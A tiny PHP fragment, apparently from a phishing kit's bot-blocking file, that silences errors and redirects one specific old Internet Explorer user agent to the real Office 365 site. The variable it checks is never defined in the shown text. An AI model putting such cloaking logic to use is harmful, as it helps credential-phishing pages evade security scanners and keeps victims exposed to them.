<?php @error_reporting(0);
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
        header("Location: https://www.office.com/?auth=2");
		die();
}

?>